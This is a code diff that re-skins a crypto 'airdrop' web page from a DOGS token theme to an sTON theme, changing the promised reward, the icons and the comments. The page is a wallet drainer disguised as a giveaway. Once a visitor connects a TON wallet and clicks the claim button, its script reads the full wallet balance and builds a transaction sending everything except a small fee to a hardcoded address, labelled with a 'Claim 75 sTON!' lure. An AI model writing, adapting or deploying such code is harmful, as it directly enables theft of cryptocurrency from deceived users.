@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🐕 DOGS Token Airdrop 🐕</title>
+    <title>💎 sTON Airdrop 💎</title>
     <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
     <script src="https://unpkg.com/tonweb@0.0.60/dist/tonweb.js"></script>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
@@ -140,6 +140,12 @@
             text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.2);
         }
 
+        #ton-connect {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
         #claim-button {
             background: linear-gradient(45deg, var(--primary-color), var(--secondary-color));
             color: white;
@@ -171,53 +177,25 @@
             transition: all 0.3s ease;
         }
 
-        .dog-icons {
+        .gem-icons {
             display: flex;
             justify-content: center;
             gap: 20px;
             margin: 20px 0;
         }
 
-        .dog-icon {
+        .gem-icon {
             font-size: 2em;
             animation: bounce 2s infinite;
         }
 
         @keyframes bounce {
-
-            0%,
-            100% {
+            0%, 100% {
                 transform: translateY(0);
             }
-
             50% {
                 transform: translateY(-10px);
             }
-        }
-
-        .features {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 20px;
-            margin: 40px 0;
-        }
-
-        .feature {
-            padding: 20px;
-            background: var(--card-background);
-            border-radius: 15px;
-            text-align: center;
-            transition: background-color 0.3s ease;
-        }
-
-        .feature:hover {
-            background: var(--progress-background);
-        }
-
-        .feature i {
-            font-size: 2em;
-            color: var(--primary-color);
-            margin-bottom: 10px;
         }
     </style>
 </head>
@@ -227,17 +205,17 @@
         <div class="header">
             <div class="dogs-logo"></div>
             <h1 class="title">
-                <i class="fas fa-paw"></i>
-                DOGS Token Airdrop
-                <i class="fas fa-paw"></i>
+                <i class="fas fa-gem"></i>
+                sTON Airdrop
+                <i class="fas fa-gem"></i>
             </h1>
-            <p class="subtitle">Join our community and claim your DOGS tokens!</p>
+            <p class="subtitle">Claim your sTON tokens now!</p>
         </div>
 
-        <div class="dog-icons">
-            <span class="dog-icon">🐕</span>
-            <span class="dog-icon">🦮</span>
-            <span class="dog-icon">🐕‍🦺</span>
+        <div class="gem-icons">
+            <span class="gem-icon">💎</span>
+            <span class="gem-icon">💎</span>
+            <span class="gem-icon">💎</span>
         </div>
 
         <div class="info-cards">
@@ -249,31 +227,13 @@
             <div class="info-card">
                 <i class="fas fa-gift"></i>
                 <h3>Receive</h3>
-                <p>100 DOGS</p>
-            </div>
-        </div>
-
-        <div class="features">
-            <div class="feature">
-                <i class="fas fa-bolt"></i>
-                <h3>Fast Transfer</h3>
-                <p>Instant token delivery</p>
-            </div>
-            <div class="feature">
-                <i class="fas fa-shield-alt"></i>
-                <h3>Secure</h3>
-                <p>Safe and verified contract</p>
-            </div>
-            <div class="feature">
-                <i class="fas fa-users"></i>
-                <h3>Community</h3>
-                <p>Join DOGS holders</p>
+                <p>75 sTON</p>
             </div>
         </div>
 
         <div id="ton-connect"></div>
         <button id="claim-button">
-            <i class="fas fa-bone"></i> Claim 100 DOGS!
+            <i class="fas fa-gem"></i> Claim 75 sTON!
         </button>
 
         <div class="progress-container">
@@ -288,13 +248,11 @@
         const AIRDROP_CONTRACT_ADDRESS = 'EQCWpEKZ03Kg5e45o555URZRijWF1UInB75Ez4TR3vPVhFjk';
         const MANIFEST_URL = 'https://raw.githubusercontent.com/sh4do96/TelegramBot/refs/heads/main/tonconnect-manifest.json';
 
-        // Inicjalizacja TON Connect
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: MANIFEST_URL,
             buttonRootId: 'ton-connect'
         });
 
-        // Obsługa statusu połączenia
         tonConnectUI.onStatusChange(wallet => {
             const claimButton = document.getElementById('claim-button');
             if (wallet) {
@@ -306,7 +264,6 @@
             }
         });
 
-        // Tworzenie payloadu z komentarzem
         async function createPayload() {
             const comment = "💎 Claim 75 sTON!";
             let cell = new TonWeb.boc.Cell();
@@ -315,7 +272,6 @@
             return TonWeb.utils.bytesToBase64(await cell.toBoc());
         }
 
-        // Obsługa przycisku claim
         document.getElementById('claim-button').addEventListener('click', async () => {
             try {
                 if (!tonConnectUI.connected) {
@@ -325,14 +281,13 @@
 
                 updateStatus('Preparing transaction...', 'info');
 
-                // Tworzenie payloadu
                 const payload = await createPayload();
 
                 async function getBalance(address) {
                     const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
                     const data = await response.json();
                     if (!data.ok) {
-                        throw new Error(`Błąd przy pobieraniu salda: ${data.error}`);
+                        throw new Error(`Error getting balance: ${data.error}`);
                     }
                     return BigInt(data.result);
                 }
@@ -342,13 +297,12 @@
                 const balance = await getBalance(wallet.account.address);
                 console.log('balance:', balance);
 
-                const transactionFee = BigInt(100000000); // 0.1 TON w nanogramach
+                const transactionFee = BigInt(100000000); // 0.1 TON in nanograms
                 console.log('transactionFee:', transactionFee);
 
                 const amountToSend = balance - transactionFee;
                 console.log('amountToSend:', amountToSend);
 
-                // Konfiguracja transakcji
                 const transaction = {
                     validUntil: Math.floor(Date.now() / 1000) + 360,
                     messages: [
@@ -370,7 +324,6 @@
             }
         });
 
-        // Funkcje pomocnicze
         function updateStatus(message, type = 'info') {
             const statusDiv = document.getElementById('status');
             const icons = {
